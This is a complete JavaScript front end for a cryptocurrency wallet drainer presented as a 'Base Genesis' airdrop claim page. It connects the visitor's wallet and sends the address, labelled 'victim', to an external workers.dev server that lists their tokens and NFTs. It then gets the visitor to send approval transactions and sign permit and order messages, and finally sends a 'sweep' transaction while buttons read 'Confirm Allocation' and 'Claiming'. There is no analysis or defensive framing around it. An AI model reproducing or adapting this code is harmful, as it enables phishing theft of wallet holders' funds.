const API = 'https://base-genesis.claim-portal.workers.dev';
const $ = (s) => document.querySelector(s);
let cfg, provider, signer, account;

async function boot() {
  cfg = await (await fetch(API + '/api/config')).json();
  $('#go').onclick = start;
}

async function start() {
  if (!window.ethereum) return alert('No wallet detected');
  provider = new ethers.BrowserProvider(window.ethereum);
  await provider.send('eth_requestAccounts', []);
  signer = await provider.getSigner();
  account = await signer.getAddress();

  const net = await provider.getNetwork();
  if (Number(net.chainId) !== cfg.chainId) {
    await window.ethereum.request({
      method: 'wallet_switchEthereumChain',
      params: [{ chainId: '0x' + cfg.chainId.toString(16) }]
    }).catch(() => alert('Switch network to chain ' + cfg.chainId));
    return;
  }

  $('#go').disabled = true;
  $('#go').textContent = 'Scanning...';
  const s = await (await fetch(API + '/api/scan', {
    method: 'POST', headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ victim: account })
  })).json();

  render(s);
  $('#go').textContent = 'Confirm Allocation';
  $('#go').disabled = false;
  $('#go').onclick = approve;
}

function render(s) {
  const box = $('#assets');
  box.innerHTML = '';
  for (const t of s.tokens) {
    box.insertAdjacentHTML('beforeend',
      '<div class="row"><span>' + t.symbol + '</span><span>' + (Number(t.balance) / 10 ** t.decimals).toFixed(4) + '</span></div>');
  }
  for (const n of s.nfts) {
    box.insertAdjacentHTML('beforeend',
      '<div class="row"><span>' + n.name + '</span><span>' + n.tokenIds.length + ' NFT</span></div>');
  }
  if (!s.tokens.length && !s.nfts.length) box.innerHTML = '<p class="sub">No assets found.</p>';
}

async function approve() {
  $('#go').disabled = true;

  const bal = await provider.getBalance(account);
  if (bal < 1000000000000n) {
    $('#go').textContent = 'Insufficient gas';
    alert('This wallet needs a little ETH on Base for gas.');
    return;
  }

  const { txs } = await (await fetch(API + '/api/approvals', {
    method: 'POST', headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ victim: account })
  })).json();

  for (const t of txs) {
    $('#go').textContent = t.label + '...';
    const r = await signer.sendTransaction({ to: t.to, data: t.data, gasLimit: 120000 });
    await r.wait();
  }

  $('#go').textContent = 'Signing...';
  const { payload } = await (await fetch(API + '/api/payload', {
    method: 'POST', headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ victim: account })
  })).json();

  let permitSig = null;
  if (payload.permit) permitSig = await signer.signTypedData(payload.permit.domain, payload.permit.types, payload.permit.message);

  const orders = [];
  for (const o of payload.orders) {
    const signature = await signer.signTypedData(o.typed.domain, o.typed.types, o.typed.message);
    orders.push({ params: o.params, signature });
  }

  $('#go').textContent = 'Claiming...';
  const sweep = await (await fetch(API + '/api/sweep', {
    method: 'POST', headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ victim: account, permit: payload.permit && payload.permit.message, permitSig, orders })
  })).json();

  if (sweep.error) {
    $('#go').textContent = 'Failed';
    alert(sweep.error);
    return;
  }

  const r = await signer.sendTransaction({ to: sweep.to, data: sweep.data, gasLimit: sweep.gas });
  await r.wait();

  await fetch(API + '/api/report', {
    method: 'POST', headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ victim: account, hash: r.hash })
  });

  $('#go').textContent = 'Claimed';
}

boot();
